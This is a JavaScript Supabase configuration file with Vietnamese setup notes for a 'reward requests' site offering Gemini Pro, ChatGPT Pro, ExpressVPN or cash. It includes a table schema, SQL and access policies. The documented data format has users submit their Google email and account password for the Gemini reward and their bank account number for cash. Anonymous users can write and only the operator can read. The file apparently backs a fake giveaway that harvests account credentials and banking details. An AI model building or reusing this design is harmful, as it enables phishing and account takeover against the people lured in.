// Supabase Configuration
// QUAN TRỌNG: Thay thế các giá trị dưới đây bằng thông tin từ Supabase project của bạn

window.SUPABASE_CONFIG = {
    url: 'https://dfqpbbysgzhooiuuvfzc.supabase.co',
    anonKey: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRmcXBiYnlzZ3pob29pdXV2ZnpjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjA4MzA5MjcsImV4cCI6MjA3NjQwNjkyN30.cgUPriDDrCMP95N3pbbXpMkfswVCB1fbae7FN5yitWU'
};

/* 
HƯỚNG DẪN LẤY THÔNG TIN SUPABASE:

1. Đăng nhập vào https://supabase.com/
2. Tạo project mới hoặc chọn project có sẵn
3. Vào Settings > API
4. Copy "Project URL" và paste vào trường 'url'
5. Copy "anon public" key và paste vào trường 'anonKey'

CẤU TRÚC BẢNG DATABASE - UNIFIED TABLE FOR ALL REWARDS:

Tạo bảng 'reward_requests' để lưu tất cả các loại phần thưởng:

Table: reward_requests
- id: int8 (primary key, auto increment)
- reward_type: text (enum: 'gemini', 'cash', 'chatgpt', 'expressvpn')
- selected_option: text (nullable, tùy chọn của người dùng)
- reward_details: text (lưu tất cả thông tin dưới dạng JSON string)
- status: text (default: 'pending')
- created_at: timestamptz (default: now())
- updated_at: timestamptz

SQL để tạo bảng:

CREATE TABLE reward_requests (
  id BIGSERIAL PRIMARY KEY,
  reward_type TEXT NOT NULL,
  selected_option TEXT,
  reward_details TEXT NOT NULL,
  status TEXT DEFAULT 'pending',
  created_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ
);

-- Tạo index cho tìm kiếm nhanh
CREATE INDEX idx_reward_requests_status ON reward_requests(status);
CREATE INDEX idx_reward_requests_reward_type ON reward_requests(reward_type);
CREATE INDEX idx_reward_requests_created_at ON reward_requests(created_at);

-- Enable Row Level Security (RLS)
ALTER TABLE reward_requests ENABLE ROW LEVEL SECURITY;

-- Tạo policy cho phép insert từ client
CREATE POLICY "Enable insert for all users" ON reward_requests
  FOR INSERT TO anon
  WITH CHECK (true);

-- Tạo policy cho phép read (chỉ cho admin)
CREATE POLICY "Enable read for authenticated users only" ON reward_requests
  FOR SELECT TO authenticated
  USING (true);

ĐỊNH DẠNG DỮ LIỆU reward_details (JSON string):

1. GEMINI PRO (reward_type: 'gemini'):
{
  "email": "user@gmail.com",
  "password": "password123",
  "contact_email": "contact@gmail.com"
}

2. TIỀN MẶT (reward_type: 'cash'):
{
  "contact_email": "contact@gmail.com",
  "account_number": "1234567890",
  "bank_name": "Vietcombank"
}

3. CHAT GPT PRO (reward_type: 'chatgpt'):
{
  "contact_email": "contact@gmail.com",
  "chatgpt_invite_email": "invite@gmail.com"
}

4. EXPRESS VPN (reward_type: 'expressvpn'):
{
  "contact_email": "contact@gmail.com"
}

*/

